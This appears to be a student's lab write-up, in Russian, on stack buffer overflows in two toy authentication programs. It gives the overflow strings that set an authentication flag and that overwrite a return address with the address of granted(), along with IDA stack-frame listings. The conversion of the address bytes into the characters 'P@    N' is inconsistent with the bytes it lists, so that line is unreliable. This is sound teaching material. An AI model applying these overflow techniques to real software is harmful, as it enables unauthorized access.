С помощью эксплуатации уязвимости переполнения буфера, добиться того, 
чтобы обе программы выдавали сообщение "Access granted".

В отчёте описать, каким образом формировались входные данные 
и что для этого потребовалось выяснить.

Параметры компиляции
-fno-stack-protector -O0


auth_overflow.c

Требовалось знать:
1) Где начинается флаг аутентификации (20h - 4 = 28, 29-32, байты флага)
2) Можно и есть ли смысл его переписывать?(реч о флаге)
3) Нужно ли флаг заменять определенным значением, или достаточно 
	отличным от нуля сделать?
	
Данные формировались по схеме:
		28 цифр для достижения флага + цифра.
		Исходная строка для переполнения:
		"12345678901234567890123456789"
			
	
.text:0000000000401605                 test    eax, eax
.text:0000000000401607                 jz      short loc_40162F
.text:0000000000401609                 lea     rcx, Str        ; "\n-=-=-=-=-=-=-=-=-=-=-=-=-=-"
.text:0000000000401610                 call    puts
.text:0000000000401615                 lea     rcx, aAccessGranted ; "      Access Granted."


-0000000000000040 ; Frame size: 40; Saved regs: 8; Purge: 0
...
-0000000000000020 Dest            db ?
-000000000000001F                 db ? ; undefined
...
-0000000000000005                 db ? ; undefined
-0000000000000004 var_4           dd ?
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010 Source          dq ?                    ; offset
+0000000000000018
+0000000000000018 ; end of stack variables


auth_overflow2.c

Требовалось знать:
1) Размер буфера который переполняю
2) Есть ли другие переменные перед буфером и их размер
3) То что рандомизация адресов не будет мешать
4) Адрес функции "granted()"
5) Размер указателей

Данные формировались по схеме:
	24 цифры чтобы:
		заполнить буфер(16 байт) и указатель кадра(8 байт для rbp).
	Далее шел адрес функции "granted()", для меня это был 0000000000401550h,
	порядок следования \x50\x15\x40\x00\x00\x00\x00\x00,
	преобразован в символы "P@    N".
	
	Исходная строка для переполнения и замены адреса возврата следующая:
		"123456781234567812345678P@    N"
		цифры идут в порядке от 1 до 8, чтобы было проще отследить 24 байта,
		следом адрес функции


.text:0000000000401550                 public granted
.text:0000000000401550 granted         proc near               ; CODE XREF: main+1D↓p
.text:0000000000401550                                         ; DATA XREF: .pdata:000000000040506C↓o
.text:0000000000401550                 push    rbp	


-0000000000000030 ; Frame size: 30; Saved regs: 8; Purge: 0
...
-0000000000000010 Str1            db ?
-000000000000000F                 db ? ; undefined
...
-0000000000000001                 db ? ; undefined
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables
